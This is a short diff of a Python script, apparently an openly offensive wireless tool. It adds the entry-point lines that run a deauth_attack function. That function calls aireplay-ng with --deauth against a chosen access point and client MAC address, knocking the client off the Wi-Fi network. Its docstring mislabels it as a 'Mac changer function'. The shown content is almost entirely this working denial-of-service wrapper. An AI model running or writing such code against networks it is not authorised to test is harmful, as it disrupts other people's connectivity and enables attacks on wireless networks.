@@ -1,3 +1,4 @@
+
 import subprocess
 import optparse
 import re
@@ -28,3 +29,6 @@ def deauth_attack(client_bssid, deauth_pack, client_mac, interface):
     '''Mac changer function '''
     print(f'deauth attack against {client_bssid}  on {client_mac}using {interface}')
     subprocess.call(['aireplay-ng', '--deauth', deauth_pack, '-a', client_bssid, '-c', client_mac, interface  ])
+
+options = get_input()
+deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac, options.interface)
